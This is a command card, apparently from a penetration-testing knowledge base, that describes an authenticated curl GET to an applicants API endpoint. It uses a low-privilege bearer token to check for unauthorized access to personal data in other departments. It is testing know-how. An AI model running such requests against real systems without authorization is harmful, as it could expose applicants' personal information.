---
id: cmd-877300-curl-get
name: curl-authenticated-get
type: command
executor: bash
data: >-
  curl -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json"
  https://target-app.com/api/applicants
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:28.503Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - web
  - api
  - recon
verified: false
validated: true
submitted: true
---

# curl-authenticated-get

## Command

```bash
curl -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" https://target-app.com/api/applicants
```

## Description

This command performs an authenticated GET request to a web API endpoint using curl, targeting applicant lists in a system vulnerable to privilege escalation. Use it to test for unauthorized data access with a low-privilege token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Authorization: Bearer YOUR_TOKEN"` | Specifies the bearer token for authentication | Yes |
| `-H "Content-Type: application/json"` | Sets the request header for JSON responses | Yes |
| `https://target-app.com/api/applicants` | The URL of the vulnerable endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." https://lark-app.com/api/applicants
```

### Advanced Usage

```bash
curl -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -v https://target-app.com/api/applicants > response.json
```

> The -v flag enables verbose output for debugging, and redirection saves the response to a file.

## Expected Output

A JSON response containing an array of applicant objects, e.g., {"applicants": [{"id": 1, "name": "John Doe", "email": "john@example.com", "phone": "123-456-7890", "department": "HR", "status": "pending"}]}. In a vulnerable system, this will include data from unauthorized departments.

## Related

- [[Related Procedure|procedures/Access-Unrestricted-Applicant-List-Endpoint]]
